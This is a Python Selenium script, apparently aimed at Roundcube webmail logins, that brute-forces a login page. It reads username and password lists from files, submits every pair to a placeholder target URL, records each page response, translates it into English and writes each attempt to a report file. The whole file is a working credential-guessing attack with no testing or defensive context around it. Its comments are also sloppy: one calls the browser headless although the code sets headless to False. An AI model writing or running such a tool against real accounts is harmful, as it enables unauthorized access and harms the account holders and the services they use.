from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from textblob import TextBlob
import time

options= Options()
options.headless = False    # setting chrome headless to true so that no tabs will be opened and no load on memory
chromeDriver='chromedriver.exe'
browser = webdriver.Chrome(chromeDriver, options=options)


filteredUsername=[]
filteredPasswords=[]
with open('Usernames') as f:     #for reading the usernames from a specified file
    usernames = f.readlines()
with open('Passwords') as f:     #for reading the passwords from a specified file
    passwords = f.readlines()
for i in usernames:                         # for filtereing any \n from list
    filteredUsername.append(i.strip())
for p in passwords:                         # for filtereing any \n from list
    filteredPasswords.append(p.strip())
#print(filteredUsername)
#print(filteredPasswords)
totalUsers=len(filteredUsername)
totalPasswords=len(filteredPasswords)
totalCombinations=totalUsers*totalPasswords        # Calculating total no of combinations for brute force
iterator=0
for u in range(len(filteredUsername)):          # Nesteed for loop for ietrations for combinations
    for p in range(len(filteredPasswords)):
        iterator=iterator+1
        print(" **************************************************************************************")
        print("Combination no. " + str(iterator) + " of " + str(totalCombinations))
        print(filteredUsername[u])
        print(filteredPasswords[p])
        browser = webdriver.Chrome(chromeDriver, options=options)
        browser.get("Target_URL_Here")
        find_serial = browser.find_element_by_id('rcmloginuser')
        find_serial.send_keys(filteredUsername[u])
        find_serial = browser.find_element_by_id('rcmloginpwd')
        find_serial.send_keys(filteredPasswords[p])
        button = browser.find_element_by_id('rcmloginsubmit')
        button.click()
        time.sleep(4)
        pageMessage = browser.find_element_by_id('messagestack').text
        print(pageMessage)
        blob = TextBlob(pageMessage)
        translatedMessage=blob.translate(to='en')
        print(translatedMessage)
        with open('Reports.txt','a' , encoding='utf8') as file:
            file.write("Username : "+str(filteredUsername[u])+'\n')
            file.write("Password : "+str(filteredPasswords[p])+'\n')
            file.write("Page Message : "+str(pageMessage)+'\n')
            file.write("Translated message : "+str(translatedMessage)+'\n')
            file.close
        print(" **************************************************************************************")






